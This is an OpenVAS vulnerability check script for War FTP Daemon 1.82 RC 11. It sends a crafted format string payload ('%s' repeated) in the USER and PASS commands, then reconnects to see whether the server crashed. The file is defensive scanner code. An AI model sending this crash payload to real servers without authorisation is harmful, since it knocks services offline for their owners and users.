###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_war_ftp_format_string_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# War FTP Daemon 'USER' and 'PASS' Remote Format String Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to cause a denial of service.
  Impact Level: Application";
tag_affected = "War FTP Daemon 1.82 RC 11";
tag_insight = "The flaw is due to a format string error when the username and
  password are received in a ftp request. This can be exploited to crash the
  application via a ftp request packet containing a specially crafted username
  and password fields.";
tag_solution = "No solution or patch is available as of 03rd, September 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.warftp.org";
tag_summary = "This host is running War FTP and is prone to format string
  vulnerability.";

if(description)
{
  script_id(802452);
  script_version("$Revision: 12 $");
  script_bugtraq_id(55338);
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-09-04 10:51:01 +0530 (Tue, 04 Sep 2012)");
  script_name("War FTP Daemon 'USER' and 'PASS' Remote Format String Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://1337day.com/exploits/19291");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/20957/");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2012/Aug/383");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/116122/warftp-format.txt");

  script_description(desc);
  script_summary("Determine if War FTP is prone to denial of service");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("FTP");
  script_require_ports("Services/ftp", 21);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("ftp_func.inc");

ftpPort = "";
banner = "";
soc = "";
fsUser = "";
fsPass = "";
soc1 = "";
resp = "";

## Get the default FTP port
ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## Check FTP Port Status
if(!get_port_state(ftpPort)){
  exit(0);
}

## Confirm the application with FTP banner
banner = get_ftp_banner(port:ftpPort);
if("WarFTPd" >!< banner){
  exit(0);
}

## Open TCP Socket
soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

## Construct and send Crafted Request
fsReq = '%s%s%s%s%s%s%s%s%s%s%s%s';

fsUser = string("USER ", fsReq, "\r\n");
fsPass = string("PASS ", fsReq, "\r\n");

send(socket:soc, data:fsUser);
send(socket:soc, data:fsPass);

## Close FTP socket
ftp_close(socket:soc);

sleep(2);

## Try to open the socket, if not able to
## open the socket means ftp server is dead
soc1 = open_sock_tcp(ftpPort);
if(!soc1)
{
  security_hole(port:ftpPort);
  exit(0);
}

resp = ftp_recv_line(socket:soc1, length:100);
if("WarFTPd" >!< resp)
{
  security_hole(port:ftpPort);
  ftp_close(socket:soc1);
  exit(0);
}

ftp_close(socket:soc1);
